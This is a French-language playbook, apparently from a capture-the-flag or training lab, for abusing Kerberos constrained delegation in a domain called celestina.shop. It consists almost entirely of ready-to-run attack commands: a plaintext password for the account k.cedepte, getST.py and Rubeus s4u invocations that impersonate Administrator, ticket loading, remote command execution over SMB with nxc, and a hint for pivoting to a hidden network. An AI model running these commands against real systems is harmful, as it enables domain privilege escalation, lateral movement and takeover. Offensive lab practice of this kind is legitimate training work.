# Playbook 07 — Délégation contrainte (S4U)

> Runbook étapes 65–72 | Challenge : *Libéré, délivré, non contraint* (souvent **constrained** en pratique)

## Prérequis

- **k.cedepte** / `R3m0t3Pr1v1l3g35@H4nd!` (description LDAP)
- BloodHound : `"allowedtodelegate": ["HTTP/WK-155"]`

---

### Étape 1 — Vérifier délégation dans JSON

```bash
grep -i -C 10 "k.cedepte" *users*.json | grep -i delegate
```

---

### Étape 2 — getST — impersonate Administrator vers WK-155

**Essai 1 — SPN HTTP (souvent le bon sur Celestina)** :

```bash
getST.py -dc-ip 10.13.37.42 -spn HTTP/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
```

**Essai 2 — SPN cifs si échec ou KRB_AP_ERR_BADMATCH** :

```bash
getST.py -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
```

**Résultat attendu** : fichier `Administrator.ccache` créé.

**Si** `command not found` : utiliser `getST.py` (pas `impacket-getST`).

---

### Étape 3 — Charger le ticket

```bash
export KRB5CCNAME="$(pwd)/Administrator.ccache"
klist
```

---

### Étape 4 — Tester accès admin WK-155

```bash
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache -x 'whoami'
```

**Résultat attendu** : `(Pwn3d!)` ou exécution commande réussie.

---

### Étape 5 — ipconfig WK-155 (pivot réseau caché)

```bash
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache -x 'ipconfig'
```

**Chercher** : interface `10.37.13.x` → [09-pivot-reseau-cache.md](09-pivot-reseau-cache.md).

---

### Étape 6 — Rubeus alternative (si getST échoue)

Sur Windows avec Rubeus :

```powershell
.\Rubeus.exe s4u /user:k.cedepte /rc4:HASH_OR_PASSWORD /impersonateuser:Administrator /msdsspn:cifs/WK-155.celestina.shop /ptt
```

---

### Notes TP blanc (à compléter après reprise labo)

- Dernière commande connue : `getST.py` lancé, sortie tronquée dans discuss_gemini.
- Documenter ici la sortie exacte et le flag obtenu après re-test.
